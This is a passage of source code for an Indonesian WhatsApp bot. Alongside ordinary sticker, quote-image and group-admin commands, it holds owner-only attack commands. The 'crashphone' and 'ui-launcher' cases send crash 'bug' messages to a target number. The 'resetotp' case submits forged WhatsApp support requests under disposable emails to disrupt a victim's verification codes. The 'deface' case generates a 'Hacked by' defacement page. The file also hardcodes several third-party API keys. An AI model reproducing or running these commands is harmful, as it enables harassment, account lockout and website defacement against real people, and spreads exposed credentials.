│┝ 𝚝𝚠𝚒𝚝𝚝𝚎𝚛
│┝ 𝚟𝚒𝚍𝚎𝚢
│┕━┉┉┉┉┉┉┉┉┉┉┉┉ᚋ
│┌───᚜𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔᚛ᚅ
│┝ 𝚜𝚝𝚒𝚔𝚎𝚛
│┝ 𝚚𝚌
│┝ 𝚚𝚌2
│┝ 𝚝𝚘𝚞𝚛𝚕
│┝ 𝚛𝚎𝚖𝚒𝚗𝚒
│┝ 𝚋𝚒𝚗𝚐
│┕┉┉┉┉┉┉┉┉┉┉┉┉┉ᚋ
│┌───᚜𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔᚛ᚅ
│┝ 𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔
│┝ 𝚐𝚛𝚘𝚞𝚙
│┝ 𝚎𝚍𝚒𝚝𝚍𝚎𝚜𝚔
│┝ 𝚎𝚍𝚒𝚝𝚜𝚞𝚋𝚓𝚎𝚌𝚝
│┝ 𝚙𝚛𝚘𝚖𝚘𝚝𝚎
│┝ 𝚍𝚎𝚖𝚘𝚝𝚎
│┝ 𝚝𝚊𝚐𝚊𝚕𝚕
│┝ 𝚑𝚒𝚍𝚎𝚝𝚊𝚐
│┝ 𝚎𝚟𝚎𝚛𝚢𝚘𝚗𝚎
│┝ 𝚜𝚎𝚗𝚍𝚕𝚒𝚗𝚔𝚐𝚌
│┝ 𝚕𝚒𝚗𝚔𝚐𝚌
│┝ 𝚛𝚎𝚜𝚎𝚝𝚕𝚒𝚗𝚔𝚐𝚌
│┝ 𝚘𝚙𝚎𝚗𝚝𝚒𝚖𝚎
│┝ 𝚌𝚕𝚘𝚜𝚎𝚝𝚒𝚖𝚎
│┕┉┉┉┉┉┉┉┉┉┉┉ᚋ
│┌───᚜𝐅𝐔𝐍 𝐌𝐄𝐍𝐔᚛ᚅ
│┝ gantengcek / cekganteng Ⓖ
│┝ cantikcek / cekcantik Ⓖ
│┝ gaycek / cekgay Ⓖ
│┝ lesbycek / ceklesby Ⓖ
│┝ pintercek / cekpinter Ⓖ
│┝ goblokcek / cekgoblok Ⓖ
│┝ nolepcek / ceknolep Ⓖ
│┝ sadcek / ceksad Ⓖ
│┝ coolcek / cekcool Ⓖ
│┝ senangcek / ceksenang Ⓖ
│┝ bapercek / cekbaper Ⓖ
│┝ wibucek / cekwibu Ⓖ
│┝ sangecek / ceksange Ⓖ
│┝ haramcek / cekharam Ⓖ
│┝ jahatcek / suhucek Ⓖ
│┝ jujurcek / cekjujur Ⓖ
│┝ bohongcek / cekbohong Ⓖ
│┝ cekkhodam Ⓖ
│┕━┉┉┉┉┉┉┉┉┉┉┉┉ᚋ
│ © created by ${botname}
╰──────────┈`
let media = { 
image: await fs.readFileSync("./lib/image.jpg")
 }
let button = { }
gans.sendButtonMedia(m.chat, menunya, `© by Deffxdtz [C.D.T]`, media, button, m)
}
break

case "crashphone1":
case "crashphone2":
case "crashphone3": {
          if (!itsMeGans) return m.reply("lu bkan owner");
          if (!q) return m.reply("Penggunaan pake nomor cil");
          let numb = q.replace(/[^0-9]/g, '');
          if (numb.startsWith('0')) return m.reply("• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara️");
          let targetnya = numb + "@s.whatsapp.net";
          await m.reply("_#sending process..._");
          await sendBugGanas(targetnya);
          await buttonMessageBUG(targetnya);
          await sendMessageBugCrash(targetnya);
          await sendMessageBugCrash(targetnya);
          await sendBugGanas(targetnya);
          await buttonMessageBUG(targetnya);
          await m.reply("_#Successfully submitted bug to " + targetnya + "_\n✉︎ *Pause 5 minutes so the bot doesn't get banned*");
        }
        break;
case "ui-launcher1":
case "ui-launcher2":
case "ui-ui-launcher3": {
          if (!itsMeGans) return m.reply("lu bkan owner");
          if (!q) return m.reply("Penggunaan pake nomor cil");
          let numb = q.replace(/[^0-9]/g, '');
          if (numb.startsWith('0')) return m.reply("• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara️");
          let target = numb + "@s.whatsapp.net";
          await m.reply("_#sending process..._");
          await sendBugGanas(target);
          await buttonMessageBUG(target);
          await sendMessageCrash(target);
          await sendBugGanas(target);
          await buttonMessageBUG(target);
          await m.reply("_#Successfully submitted bug to " + target + "_\n✉︎ *Pause 5 minutes so the bot doesn't get banned*");
        }
        break;
        case "deface":
        if (!itsMeGans) return m.reply("lu bukan owner");
        if (!q) return m.reply("Masukkan Namamu");
        const messTeks = {
          text: "<!DOCTYPE html><html>\n  <head>\n    <center>\n      <img src=\"https://b.top4top.io/p_3062ktq8j0.png\"width=\"350px\">\n    </center>\n  <title> Hacked by ☠️ Mr." + q + " 👑</title>\n  <meta charset=\"UTF-8\"/>\n  <meta name=\"author\" content=\"" + q + "\"/>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"/>\n  <meta name=\"description\" content=\"\"/>\n  <meta property=\"og:title\" content=\" BACOT JANGAN SOK-SOK BAIK LOO/>\n  <meta name=\"keywords\" content=\"" + q + "  - Alwaysaqioo, Mr Elang Xploit ,hacked by " + q + " ,haxor uploader, haxor script deface generator, nathan prinsley, mr.prins, prinsh, hacked by, haxor my id\"/>\n  <meta property=\"og:image\" content=\"\"/>\n  <meta property=\"og:type\" content=\"website\"/> <meta property=\"og:site_name\" content=\"" + q + "\"/><link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"\" /><link rel=\"stylesheet\" type=\"text/css\" href=\"https://cdn.prinsh.com/NathanPrinsley-textstyle/nprinsh-stext.css\"/><style>body{background: black;font-family:Courier New;margin-top:35px;}h1,h2{margin-top:.3em;margin-bottom:.3em;}h1.nprinsleyy{color:#dbd9d9;}h2{color:#07ad1d;}p.message_prinsley{color:#dbd9d9;margin-top:.25em;margin-bottom:.25em;font-size:16px;font-weight:unset;}.hubungi_prinsh{color:#dbd9d9;text-decoration:none;}.hubungi_prinsh:hover{color:red}.othermes_nprinsh{color:#dbd9d9;font-size:16px;}marquee.foonathanPrinsley{display:none;position: fixed; width: 100%; bottom: 0px; font-family: Tahoma; height: 20px; color: white; left: 0px; border-top: 2px solid darkred; padding: 5px; background-color: black}</style></head><body><center/><img src=\"\" style=\"width: 20%\">\n  <h1 class=\"nprinsleyy nprinsley-text-glitchan\" style=\"font-size:20px;\"> ☠️ " + q + " 👑 </h1><h2 style=\"font-size:20px;\" class=\"nprinsley-text-redan\">WELCOME TO WEBSITE " + q + "</h2><p class=\"message_prinsley nathan-prinsley_none\"></p><hr/><p style=\"font-size:14px;\" class=\"nprinsley-text-blupelan\"><a class=\"</a></p><p class=\"othermes_nprinsh nprinsley-text-glitchan\">We are a group of Muslim hackers who want to eradicate crime\n </p> <center> <audio controls aria-setsize=\"8\">\n\t\t\t<source src=\"https://f.top4top.io/m_3033r85vv0.mp3\" type=\"audio/mpeg\">\n\t\t\tJangan banyak bacot doang</audio> </center> <arquee class=\"foonathanPrinsley\"><b style=\"color: #dbd9d9;font-size:16px;\" class=\"nathan-prinsley_none\"></b></marquee>\n  </center>\n  <script src=\"https://cdn.prinsh.com/NathanPrinsley-effect/efek-salju.js\" type=\"text/javascript\"></script>\n  <table border=\"2\">\n    <tr>\n      <td>\n        <center>\n  <a href=\"https://youtube.com/@qioaje\"><button>YOUTUBE</button></a>\n  </center>\n  <style>\n    button {\n      color: cyan;\n      background: black;\n    }\n  </style>\n      <br>\n<br><p class=\"style14\" align=\"center\">\n<marquee scrolldelay=\"20\" scrollamount=\"145\" direction=\"right\" behavior=\"scroll\" width=\"98%\">\n<b><font color=\"white\" face=\"Courier New\" size=\"2\">   --------------------------------------------------------------</marquee></b></font>\n<marquee scrolldelay=\"20\" scrollamount=\"8\" direction=\"left\" behavior=\"scroll\" width=\"98%\">\n<font color=\"#ff0000\" face=\"Courier New\" size=\"3\"> Thanks #Always-Compact #Fanatix_Cyber_Security #Cyber_Team_Indonesia </marquee></font>\n<br>\n<marquee scrolldelay=\"20\" scrollamount=\"145\" direction=\"left\" behavior=\"scroll\" width=\"98%\">\n<b><font color=\"white\" face=\"Courier New\" size=\"2\">   --------------------------------------------------------------</marquee></b></font>\n<iframe width=\"0\" height=\"0\" src=\"http://www.youtube.com/@qioaje/v/&autoplay=1\" frameborder=\"0\"></iframe>"
        }
        const quot = {
          quoted: m
        }
        await gans.sendMessage(from, messTeks, quot);
        sleep(2000);
        m.reply("👆  Tutor pakenya cari aja di yt");
        break;
case "resetotp": {
          if (!itsMeGans) return m.reply("lu bukan owner");
          if (m.quoted || q) {
            let tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            let targetnya = tosend.split('@')[0];
            try {
              const axioss = require("axios");
              let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/");
              const email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777");
              const cookie = ntah.headers["set-cookie"].join("; ");
              const cheerio = require("cheerio");
              const $ = cheerio.load(ntah.data);
              const $form = $("form");
              const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
              form = new URLSearchParams();
              form.append("jazoest", $form.find("input[name=jazoest]").val());
              form.append("lsd", $form.find("input[name=lsd]").val());
              form.append("step", "submit");
              form.append("country_selector", '+');
              form.append("phone_number", '+' + targetnya);
              form.append("email", email.data[0]);
              form.append("email_confirm", email.data[0]);
              form.append("platform", "ANDROID");
              form.append("your_message", "Olá, suporte pelo WhatsApp. Alguém tentou fazer login na minha conta do Whatsapp, então estou desconectado da minha conta do Whatsapp, mas infelizmente não consigo mais fazer login na minha conta do Whatsapp porque tenho que esperar 12 horas para receber o código de verificação. Por favor, redefina meu código de verificação do WhatsApp." + targetnya);
              form.append("__user", '0');
              form.append("__a", '1');
              form.append("__csr", '');
              form.append("__req", '8');
              form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0");
              form.append("dpr", '1');
              form.append("__ccg", "UNKNOWN");
              form.append("__rev", "1007735016");
              form.append("__comment_req", '0');
              const headrs = {
                cookie: cookie
              };
              res = await axioss({
                'url': url,
                'method': "POST",
                'data': form,
                'headers': headrs
              });
              m.reply("i have reset the otp on that number and remember it only works if the otp is more than 3 hours🥺🙏");
              payload = String(res.data);
              if (payload.includes("\"payload\":true")) {} else {
                if (payload.includes("\"payload\":false")) {} else {
                  m.reply(util.format(res.data));
                }
              }
            } catch (error) {
              m.reply('' + error);
            }
          } else {
            m.reply("Insert number!");
          }
        }
        break;

//========Owner Menu==========\\
case "backupsc":{
if (!itsMeGans) return reply(mess.owner)
reply(mess.wait)
  const { execSync } = require("child_process");
  const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
  (pe) =>
pe != "node_modules" &&
pe != "sessions" &&
pe != ".npm" &&
pe != ""
);
  const exec = await execSync(`zip -r New.zip ${ls.join(" ")}`);
  await gans.sendMessage(m.sender,
{
  document: await fs.readFileSync("./New.zip"),
  mimetype: "application/zip",
  fileName: `${botname}.zip`,
},
{ quoted: Ganss }
  );
  await execSync("rm -rf New.zip");
  if (m.isGroup) return reply('file BOT Dikirim Lewat Chatt Pribadi')
}
break
case 'addvip':{
if (!itsMeGans) return reply(mess.owner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return reply(`Penggunaan :\n*${prefix+command}* @tag|waktu\n*${prefix+command}* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
vip.addVipUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, vipp)
reply('Sukses')
} else {
var cekap = await gans.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
vip.addVipUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
}}
break
case 'listvip': case 'listv': {
if (!itsMeGans) return reply(mess.owner)
let txt = `*List Member VIP*\nJumlah : ${vipp.length}\n\n`
let men = [];
for (let i of vipp) {
men.push(i.id)
readTime(i.expired - Date.now()).then (res => {
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expired :* PERMANENT\n\n`
} else {
txt += `*Expire :* ${res.days} day(s) ${res.hours} hour(s) ${res.minutes} minute(s) ${res.seconds} second(s)\n\n`
}
reply(txt)
})
}
}
break

//=================================================//
case 'pengguna':  {
if (!itsMeGans) return m.reply('*khusus Premium*')
if (!args[0]) return reply(`*Contoh : ${command} add 6281214181312*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('*Pengguna Ini telah Di Ban*')
banned.push(orgnye)
reply(`Succes ban Pengguna Ini`)
} else if (args[0] === "del") {
if (!isBane) return reply('*Pengguna Ini Telah Di hapus Dari Ban*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Berhasil Menghapus Pengguna yang Di Ban*`)
} else {
reply("Error")
}
}
break
//=================================================//
case 'listban':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 teksooop = `*List Ban*\n\n`
for (let ii of banned) {
teksooop += `- ${ii}\n`
}
reply(teksooop)
break

//===========Tools Menu==========\\
case 'sticker': 
case 's': {
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await gans.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await gans.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'qc': {
if (!q) return reply(`📌Example: ${prefix + command} hallo`)
let obj = {
type: 'quote',
format: 'png',
backgroundColor: '#ffffff',
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await gans.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: `${q}`,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
gans.sendImageAsSticker(m.chat, buffer, Ganss, { packname: `${global.packname}`, author: `${global.author}`})
}
break

case 'qc2': {
if (!q) return reply(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
if (text.length > 100) return reply(`Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return reply('Warna yang dipilih tidak tersedia.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await gans.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
gans.sendImageAsSticker(m.chat, buffer, Ganss, { packname: `${global.packname}`, author: `${global.author}`})
}
break
case 'removebg': {
if (!/image/.test(mime)) return reply(`Kirim/Reply Gambar Dengan Caption ${prefix+command}\n`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Gambar Dengan Caption ${prefix+command}\n`)
let qmsg = (quoted.msg || quoted)
let remobg = require('remove.bg')
let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
hmm = await './tmp/remobg-'+getRandom('')
localFile = await gans.downloadAndSaveMediaMessage(qmsg, hmm)
outputFile = await './tmp/hremo-'+getRandom('.png')
reply(mess.wait)
remobg.removeBackgroundFromImageFile({
path: localFile,
apiKey: apinobg,
size: "regular",
type: "auto",
scale: "100%",
outputFile 
}).then(async result => {
gans.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
await fs.unlinkSync(localFile)
await fs.unlinkSync(outputFile)
})
}
break
case 'snobg': {
if (!quoted) return reply(`Kirim/Reply Gambar Dengan Caption ${prefix+command}\n`)
if (/image/.test(mime)) {
let media = await gans.downloadAndSaveMediaMessage(quoted)
let encmedia = await gans.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar Dengan Caption ${prefix+command}`)
}
}
break
case 'tourl': {
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let media = await gans.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await top4top(media)
let { result, status } = anu;
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: "Silahkan Ketik Copy Untuk Menyalin Link Foto"
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Created By GansBOTz"
}),
header: proto.Message.InteractiveMessage.Header.create({
title: `\`IMAGE URL\``,
subtitle: "GansBOTz",
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "copy",
id: "123456789",
copy_code: result,
})
}
 ],
})
})
}
}
}, {
    quoted:m
    },{})
await gans.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})

} else if (!/image/.test(mime)) {
let anu = await uploadToFileio(media)
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: "Silahkan Ketik Copy Untuk Menyalin Link video"
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Created By GansBOTz"
}),
header: proto.Message.InteractiveMessage.Header.create({
title: `\`VIDEO URL\``,
subtitle: "GansBOTz",
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
 "name": "cta_copy",
 "buttonParamsJson": JSON.stringify({
display_text: "copy",
id: "123456789",
copy_code: util.format(anu),
})
}
 ],
})
})
}
}
}, {
    quoted:m
    },{})
await gans.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
await fs.unlinkSync(media)
}
break
case 'hd': case 'remini': {
if (!quoted) return reply(`Where is the picture?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
reply(`reply(mess.admin)`)
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance")
gans.sendMessage(m.chat, { image: proses, caption: `Sukses Bang`}, { quoted: m})
}
break
case 'bing': case 'bingimg': {
if (!text) return reply("Masukan Query!")
    let old = new Date();
    let json;
    try {
        json = await fetchJson(`https://api.betabotz.eu.org/api/search/bing-img?text=${encodeURIComponent(text)}&apikey=sVTgnF6d`);
    } catch (err) {
        return m.reply(`Terjadi kesalahan saat mengambil data: ${err.message}`);
}
    // Ensure json has enough elements
    if (!json || json.length < 4) return m.reply('Data tidak lengkap untuk membuat scroll.');

    let json1 = json.result[0]
    let json2 = json.result[1]
    let json3 = json.result[2]
    let json4 = json.result[3]

    async function createImage(url) {
 if (!url) throw new Error('URL video tidak tersedia.');
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: gans.waUploadToServer
    });
    return imageMessage;
  }

    try {
        let msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: `Hasil Dari Promt ${text}`
                            },
                            carouselMessage: {
                                cards: [
                                    {
                                        header: {
                                            imageMessage: await createImage(json1),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `done Gak Bang😎 \n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                             "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'SUBSCRIBE',
        url: 'https://youtube.com/@survivofc',
        merchant_url: 'https://youtube.com/@survivofc'
      })
    },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json2),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `done Gak Bang😎 \n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                             "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'SUBSCRIBE',
        url: 'https://youtube.com/@survivofc',
        merchant_url: 'https://youtube.com/@survivofc'
      })
    },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json3),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `done Gak Bang😎 \n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                             "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'SUBSCRIBE',
        url: 'https://youtube.com/@survivofc',
        merchant_url: 'https://youtube.com/@survivofc'
      })
    },
                                            ],
                                        },
                                    },
                                    {
                                        header: {
                                            imageMessage: await createImage(json4),
                                            hasMediaAttachment: true,
                                        },
                                        body: {
                                            text: `done Gak Bang😎 \n\n©created by Deff [CDT]`
                                        },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                             "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'SUBSCRIBE',
        url: 'https://youtube.com/@survivofc',
        merchant_url: 'https://youtube.com/@survivofc'
      })
    },
                                            ],
                                        },
                                    },
                                ],
                                messageVersion: 1,
                            },
                        },
                    },
                },
            }, {quoted:Ganss},
            {}
        );

        await gans.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat mengirim pesan.');
    }
}
break

//===========Group Menu============\\
case 'antilink': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return reply('Sudah Aktif')
ntilink.push(from)
reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
reply('Succes mematikan antilink di group ini 🌷')
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'editsubject': case 'editsubjek': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
if (!text) throw 'Text nya ?'
reply('tunggu')
await gans.groupUpdateSubject(from, text)
}
break
case 'editdesk':{
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
if (!text) throw 'Text Nya ?'
reply('tunggu')
await gans.groupUpdateDescription(from, text)
}
break
case 'tagall': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
gans.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break
case 'demoteall':
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
reply('tunggu')
var groupe = await gans.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
gans.groupParticipantsUpdate(from, mems, 'demote')
break
case 'group': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMeGans) return reply(mess.admin)
if (args[0] === 'close'){
await gans.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await gans.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
let button = [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"BUKA\",\"id\":\".group open\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"TUTUP\",\"id\":\".group close\"}"
}
]
let text = `\`MODE GROUP\``
await gans.sendButText(text, 'silahkan pilih button dibawah', button, loe)
 }
}
break

case 'editinfo': {
let button = [
{
